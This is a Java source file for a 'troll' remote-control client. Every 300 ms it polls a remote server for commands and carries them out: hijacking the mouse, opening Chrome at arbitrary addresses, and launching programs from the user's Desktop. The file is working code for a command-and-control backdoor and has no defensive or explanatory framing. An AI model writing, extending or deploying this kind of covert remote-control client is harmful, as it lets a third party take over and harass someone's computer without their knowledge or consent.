package me.marton.troll;

import java.awt.Desktop;
import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

public class ActionManager {
	
	Utils utils;
	
	public ActionManager() {
		
		utils = new Utils();
		
	}
	
	public int lastActionID;
	
	public void checkForActions() {
				
		try {
			
			lastActionID = Integer.parseInt(Utils.get("https://martondev.ml/troll/lastAction.php"));
			
		} catch (IOException e) {

			e.printStackTrace();
			
		}
		
		TimerTask repeatedTask = new TimerTask() {
			
	        public void run() {
	        	
	            System.out.println("[" + new Date() + "] Checking for action...");
	            
	            try {
	            	
	            	int latestActionID = Integer.parseInt(Utils.get("https://martondev.ml/troll/lastAction.php"));
	    			
	    			if(latestActionID > lastActionID) {
	    				
	    				System.out.println("New action available");
	    				lastActionID = latestActionID;
	    				System.out.println(Utils.get("https://martondev.ml/troll/lastAction.php?actionID=" + latestActionID));
	    				
	    				handleAction(Utils.get("https://martondev.ml/troll/lastAction.php?actionID=" + latestActionID));
	    				
	    			}else {
	    				
	    				System.out.println("Last action ID: " + latestActionID);
	    				
	    			}
	    			
	    		} catch (IOException e) {

	    			e.printStackTrace();
	    			
	    		}
	            
	        }
	        
	    };
	    
	    Timer timer = new Timer("Timer");
	     
	    long delay  = 300L;
	    long period = 300L;
	    timer.scheduleAtFixedRate(repeatedTask, delay, period);
		
	}
	
	public void handleAction(String action) {
		
		if(action.toLowerCase().contains("startMouseTroll".toLowerCase())) {
			
			utils.mouseTroll(Long.parseLong(action.replace("startMouseTroll ", "")));
			
		}else if(action.toLowerCase().contains("stopMouseTroll".toLowerCase())) {
			
			utils.disableMouseTroll();			
			
		}else if(action.toLowerCase().contains("openChrome".toLowerCase())) {
			
			System.out.println("Opening chrome...");
			utils.openChrome(action.replace("openChrome ", ""));
			
		}else if(action.toLowerCase().contains("openDesktopApp".toLowerCase())) {
			
			File file = new File(System.getProperty("user.home") + "/Desktop/" + action.replace("openDesktopApp ", "") + ".lnk");
			
			if(!file.exists()) {
				
				file = new File(System.getProperty("user.home") + "/Desktop/" + action.replace("openDesktopApp ", "") + ".exe");
			
			}
			
			if(file.exists() && !file.isDirectory()) {
				
				try {
					
					Desktop.getDesktop().open(file);
					
				} catch (IOException e) {

					e.printStackTrace();
					
				}
				
			}
			
		}
		
	}

}
